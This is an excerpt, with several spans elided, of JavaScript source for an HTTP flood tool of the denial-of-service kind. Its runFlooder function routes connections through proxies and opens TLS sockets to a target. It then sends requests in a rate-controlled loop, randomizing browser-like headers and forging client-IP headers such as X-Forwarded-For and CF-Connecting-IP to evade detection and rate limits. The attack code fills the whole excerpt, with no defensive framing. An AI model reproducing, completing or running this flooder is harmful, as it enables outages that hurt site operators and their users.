...
function runFlooder() {
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            const alpnProtocol = tlsSocket.alpnProtocol || 'http/1.1';
            ...
            if (alpnProtocol !== 'h2') {
                ...
                const interval = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        ...
                        const UA = uap[Math.floor(Math.random() * uap.length)];
                        const Accept = accept_header[Math.floor(Math.random() * accept_header.length)];
                        const Encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
                        const Lang = language_header[Math.floor(Math.random() * language_header.length)];
                        const Cache = cache_header[Math.floor(Math.random() * cache_header.length)];
                        const SecChUa = sec_ch_ua[Math.floor(Math.random() * sec_ch_ua.length)];
                        const SecChUaPlatform = sec_ch_ua_platform[Math.floor(Math.random() * sec_ch_ua_platform.length)];
                        const SecChUaMobile = sec_ch_ua_mobile[Math.floor(Math.random() * sec_ch_ua_mobile.length)];
                        const Referer = refers[Math.floor(Math.random() * refers.length)];
                        const FetchMode = fetch_mode[Math.floor(Math.random() * fetch_mode.length)];
                        const FetchSite = fetch_site[Math.floor(Math.random() * fetch_site.length)];
                        const FetchDest = fetch_dest[Math.floor(Math.random() * fetch_dest.length)];
...
Sec-Ch-Ua: ${SecChUa}\r
Sec-Ch-Ua-Mobile: ${SecChUaMobile}\r
Sec-Ch-Ua-Platform: ${SecChUaPlatform}\r
Upgrade-Insecure-Requests: 1\r
Sec-Fetch-Site: ${FetchSite}\r
Sec-Fetch-Mode: ${FetchMode}\r
Sec-Fetch-User: ?1\r
Sec-Fetch-Dest: ${FetchDest}\r
Referer: ${Referer}\r
X-Forwarded-For: ${spoofIP}\r
X-Real-IP: ${spoofIP}\r
X-Client-IP: ${spoofIP}\r
CF-Connecting-IP: ${spoofIP}\r
\r`;
                ...
                tlsSocket.on('close', () => clearInterval(interval));
                tlsSocket.on('error', () => {
                    tlsSocket.destroy();
                    connection.destroy();
                });
